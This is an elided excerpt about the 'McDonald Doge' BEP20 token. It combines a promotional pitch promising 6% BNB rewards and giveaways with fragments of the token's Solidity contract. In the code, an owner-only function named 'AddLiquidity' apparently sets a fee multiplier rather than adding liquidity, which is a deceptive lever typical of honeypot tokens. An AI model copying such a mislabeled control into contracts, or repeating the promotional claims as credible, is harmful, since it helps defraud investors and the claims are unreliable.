...
The utility of this coin is planned to include NFT DApp, NFT Marketplace, 2-5 Mini games with in game NFT’s.
with a huge marketing plan to push it with a reward mechanism with an unlock of rewards once certain market caps are achieved.
McDonald-Doge is a yield-generating system that auto-rewards holders with 6% $BNB rewards and shillers with thousands in giveaways! 
   
    Relevant Links: 
      https://t.me/McDonald_Doge
      http://www.mcdonald-doge.com/
...
contract McDonaldDoge is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "McDonald Doge";
    string constant _symbol = "McDoge";
    ...
    uint256 private _maxTxAmount = rSupply.div(1000).mul(30);
    uint256 private _maxWalletToken = rSupply.div(1000).mul(30);
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0xbD841Df41437c7374e97245CA6bFf990f0a268E0;
        BuyBackReceiver = 0xbD841Df41437c7374e97245CA6bFf990f0a268E0;
    ...
    function takeFee(address sender, uint256 rAmount, bool isSell) internal returns (uint256) {
        ...
        uint256 feeAmount = rAmount.div(feeDenominator * 100).mul(totalFee).mul(Mul);
    ...
    function AddLiquidity(uint256 Mul) external onlyOwner{
        SM = Mul;        
    }
